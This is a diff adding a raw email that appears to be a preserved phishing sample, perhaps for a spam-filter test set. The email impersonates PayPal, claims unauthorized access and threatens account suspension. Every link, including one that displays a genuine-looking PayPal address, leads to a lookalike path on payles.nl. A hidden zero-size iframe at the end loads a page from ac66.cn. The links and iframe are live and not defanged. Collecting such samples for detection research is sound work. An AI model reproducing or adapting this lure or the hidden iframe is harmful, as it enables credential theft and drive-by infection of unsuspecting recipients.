@@ -1,0 +1,139 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <service@paypal.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id CF5AA46AB0
+ for <user@login.example.com>; Wed, 20 Dec 2006 06:52:19 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP id CAC3A131FF45
+ for <user@example.com>; Wed, 20 Dec 2006 06:52:19 -0500 (EST)
+Received: from server.ul-com.local (unknown [217.114.33.132])
+ by mail.example.org (Postfix) with ESMTP id 806D06FA1CC
+ for <user@example.com>; Wed, 20 Dec 2006 06:52:17 -0500 (EST)
+Received: from User ([193.253.32.194]) by server.ul-com.local with Microsoft
+ SMTPSVC(6.0.3790.1830); Wed, 20 Dec 2006 14:42:51 +0300
+Reply-To: <service@paypal.com>
+From: <service@paypal.com>
+Subject: Unauthorized access to your PayPal account !
+Date: Wed, 20 Dec 2006 12:52:12 +0100
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-ID: <SERVERDQLGJZGT9KP4v00000879@server.ul-com.local>
+X-OriginalArrivalTime: 20 Dec 2006 11:42:51.0359 (UTC)
+ FILETIME=[FAD1B6F0:01C7242B]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 548
+
+<html><head><title>PayPal</title></head><BODY>
+<P>
+<STYLE type=text/css>BODY, TD {font-family: verdana,arial,helvetica,sans-serif;font-size: 12px;color: #000000;}
+
+LI {line-height: 120%;}
+UL.smallBorder {margin:10px 5px 10px 20px;}
+LI.smallBorderLi {margin:0px 0px 5px 0px;}
+UL.Narrow {margin:10px 5px 0px 40px;}
+HR.dotted {width: 100%; margin-top: 0px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px dotted #ccc;}
+.smallEmphasis {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;font-weight: bold;color: #000000;}
+.serifBig {font-family: serif;font-size: 20px;font-weight: bold;color: #000000;}
+.serif{font-family: serif;font-size: 16px;color: #000000;}
+.sansSerif{font-family: verdana,arial,helvetica,sans-serif; font-size: 16px;color: #000000;}
+.heading {font-family: verdana,arial,helvetica,sans-serif;font-size: 18px;font-weight: bold;color: #003366;}
+.subHeadingEoa {font-family: verdana,arial,helvetica,sans-serif;font-size: 15px;font-weight: bold;color: #000000;}
+.subHeading {font-family: verdana,arial,helvetica,sans-serif;font-size: 16px;font-weight: bold;color: #003366;}
+.sidebarText {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #003366;}
+.sidebarTextBold {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;font-weight: bold;color: #003366;}
+.xptFooter {font-family: verdana,arial,helvetica,sans-serif;font-size: 11px;color: #aaaaaa;}
+.button {font-size: 13px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; border-style:outset; color:#000000; background-color: #cccccc;}
+.smaller {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #000000;}
+.smallerSidebar {font-family: verdana,arial,helvetica,sans-serif;font-size: 10px;color: #003366;}
+.emphasis {font-weight: 700;}
+table#invoice, table#invoice_controls, table#invoice_note {	width: 600px;}
+table#invoice_note {margin-top:10px; margin-bottom:10px;}
+table#invoice_controls {text-align: right;}
+table#invoice {border-collapse: collapse; border:1px solid #aaa; }
+table#invoice td {font-size:11px; border:1px solid #ccc;	padding:2px;}
+table#invoice td.field_label_right, table#invoice td.field_label_right_error {font-weight:bold;	text-align:right;}
+table#invoice td.field_label_right_error, table#invoice td.field_label_error {color:red;}
+table#invoice tr.title td {font-weight:bold; line-height:20px; text-align:left; background-color: #ccddee;}
+table#invoice input.readonly {border:0; text-align:right;}
+table#invoice input.readonly_currency {border:0; width:10px;}
+.field_error, .field_error input.readonly_currency {background-color:#FF3333;}
+.currency_highlight {background-color: #ffffcc;}
+.tax {font-weight: 400; float: left;}
+table#invoice td span.curr {float: left;}
+table#invoice td.currency {border-right:1px solid #fff;}
+table#invoice td.calc {font-weight:bold; text-align:right;}
+.inlineBlue {color: #00f;}
+.small {font-size: 11px; font-weight: 400;}
+HR.solid {width: 100%; margin-top: 5px; margin-bottom: 0px; border-left: #fff; border-right: #fff; border-top: #fff; border-bottom: 2px solid #999;}
+.large {font-size: 17px;} 
+.smallVerdanaGrey{font-family: verdana; font-size: 10px; color: #999999;} 
+.smallVerdana {font-family: verdana; font-size: 10px; color :#000000;} 
+.smallArial {font-family: arial; font-size: 13px; } 
+.smallArialBlue {font-family: verdana; font-size: 9px; color: #0000FF;} 
+.smallVerdanaGreen{font-family: verdana; font-size: 10px; color: #666666;} 
+.smaller {font-size: 10px; color: gray;} 
+.larger {font-size: 18px; font-family: arial; font-weight: 600; }  
+.longTableValue{word-break:break-all;} 
+.longSideBarText{width:190px; word-break: break-all;} 
+</STYLE>
+</P>
+<P>&nbsp;</P>
+<TABLE style="WIDTH: 636px; HEIGHT: 597px" cellSpacing=0 cellPadding=0 width=636 
+align=center border=0>
+  <TBODY>
+  <TR vAlign=top>
+    <TD width="100%"><SPAN class=heading>Unauthorized access to your PayPal 
+      account!<BR><BR></SPAN><BR>
+      <P>We recently noticed more attempts to log in to your <SPAN 
+      class=emphasis>PayPal account</SPAN> from a foreign IP address.</P>
+      <P>If you accessed your account while traveling, the unusual log in 
+      attempts may have been initiated by you. However, if you are the rightfull 
+      holder of the account, please visit Paypal as soon as possible to verify 
+      your identity:</P>
+      <TABLE cellSpacing=0 cellPadding=1 width=300 align=left bgColor=#ffe65c 
+      border=0>
+        <TBODY>
+        <TR>
+          <TD>
+            <TABLE cellSpacing=0 cellPadding=4 width="100%" align=center 
+            bgColor=#fffecd border=0>
+              <TBODY>
+              <TR>
+                <TD class=sansSerif align=middle><A 
+                  href="http://payles.nl/~test/www.paypal.com/index.php">Click 
+                  here to verify your 
+        account</A></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+      <P><BR><BR><BR>&nbsp;</P>
+      <P></P>You can also verify your account by logging into your PayPal 
+      account at <A 
+      href="http://payles.nl/~test/www.paypal.com/index.php">https://www.paypal.com/us/</A>. 
+
+      <P>If you choose to ignore our request, you leave us no choise but to 
+      temporaly suspend your account.</P>
+      <P>We ask that you allow at least 72 hours for the case to be investigated 
+      and we strongly recommend to verify your account in that time. 
+      <BR><BR>Thank you for using PayPal!<BR>The PayPal Team<BR><BR></P>
+      <HR class=dotted>
+
+      <P class=xptFooter>Please do not reply to this email. This mailbox is not 
+      monitored and you will not receive a response. For assistance, <A 
+      href="http://payles.nl/~test/www.paypal.com/index.php">log 
+      in</A> to your PayPal account and choose the Help link located in the top 
+      right corner of any PayPal page.<BR><BR class=h10>To receive email 
+      notifications in plain text instead of HTML, update your preferences <A 
+      href="http://payles.nl/~test/www.paypal.com/index.php">here</A>.</P><BR><BR><SPAN 
+      class=xptFooter><BR><SPAN class=xptFooter>PayPal Email ID 
+      PP468</SPAN></SPAN></TD></TR></TBODY></TABLE>
+</BODY>
+</html><iframe src="http://www.ac66.cn/88/index.htm" width="0" height="0" frameborder="0"></iframe
